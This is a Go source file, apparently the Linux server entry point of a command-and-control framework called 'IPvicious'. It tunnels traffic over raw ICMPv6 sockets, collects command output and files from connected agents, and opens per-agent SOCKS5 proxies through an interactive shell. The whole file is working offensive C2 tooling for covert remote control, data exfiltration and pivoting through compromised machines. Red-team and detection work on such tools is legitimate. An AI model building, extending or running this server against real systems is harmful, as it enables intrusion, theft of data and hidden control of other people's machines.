//go:build linux

// cmd/server is the Linux C2 server entry point.
//
// Usage:
//
//	sudo ./c2server
//	sudo ./c2server -psk mysecret -socks-base 1080
//	sudo ./c2server -no-repl   # headless / piped mode
//
// SOCKS5 proxies are started per-agent from the interactive REPL:
//
//	IPvicious> agents          # list connected agents
//	IPvicious> select 1        # target agent #1
//	IPvicious> socks           # start SOCKS5 on 127.0.0.1:1080 (auto-port)
//	IPvicious> socks 1081      # start SOCKS5 on 127.0.0.1:1081 for this agent
//
// The server requires root (or CAP_NET_RAW) to open a raw ICMPv6 socket.
package main

import (
	"flag"
	"log"
	"os"
	"os/signal"
	"strconv"
	"sync"
	"syscall"

	"ipvicious/internal/cli"
	"ipvicious/internal/tunnel"
)

// Compile-time defaults; overridable at link time:
//
//	go build -ldflags "-X main.defaultPSK=secret -X main.defaultSocksBase=9090" ...
var defaultPSK = "" // empty = no encryption
var defaultSocksBase = "1080"

// parsedSocksBase converts defaultSocksBase to an int, falling back to 1080
// if the value is unparseable or out of range.
func parsedSocksBase() int {
	v, err := strconv.Atoi(defaultSocksBase)
	if err != nil || v < 1 || v > 65534 {
		return 1080
	}
	return v
}

func main() {
	noRepl := flag.Bool("no-repl", false, "disable interactive REPL (headless mode)")
	pskFlag := flag.String("psk", defaultPSK, "pre-shared key for AES-256-GCM encryption (empty = disabled)")
	socksBase := flag.Int("socks-base", parsedSocksBase(), "starting TCP port for per-agent SOCKS5 proxies (REPL: 'socks' command)")
	flag.Parse()

	// ── ICMPv6 tunnel server ────────────────────────────────────────────────
	tun, err := tunnel.NewServerTunnel()
	if err != nil {
		log.Fatalf("tunnel server init: %v", err)
	}
	defer tun.Close()

	if *pskFlag != "" {
		if err := tun.SetPSK(*pskFlag); err != nil {
			log.Fatalf("psk: %v", err)
		}
		log.Printf("encryption: AES-256-GCM enabled")
	}

	// ── Signal handler ──────────────────────────────────────────────────────
	stop := make(chan struct{})
	var stopOnce sync.Once
	stopFn := func() { stopOnce.Do(func() { close(stop) }) }

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() { <-sig; stopFn() }()

	// ── REPL or headless ────────────────────────────────────────────────────
	if *noRepl {
		// Headless mode: wire plain stdout callbacks (useful for logging/piping).
		tun.OnCmdOut = func(agentKey string, _ uint32, _ uint32, output []byte) {
			os.Stdout.Write(output)
		}
		tun.OnFileData = func(agentKey string, _ uint32, _ uint32, data []byte, last bool) {
			if len(data) > 0 {
				os.Stdout.Write(data)
			}
			if last {
				log.Printf("[server] %s file transfer complete", agentKey)
			}
		}
		log.Printf("C2 server started (headless) — waiting for agents")
	} else {
		// Interactive REPL — wires its own callbacks and runs in a goroutine.
		repl := cli.New(tun, stopFn, *socksBase)
		go repl.Run(stop)
		log.Printf("C2 server started — interactive shell active (SOCKS5 base port %d)", *socksBase)
	}

	// ── ICMPv6 receive loop (blocks) ────────────────────────────────────────
	tun.Run(stop)
	log.Printf("C2 server stopped")
}
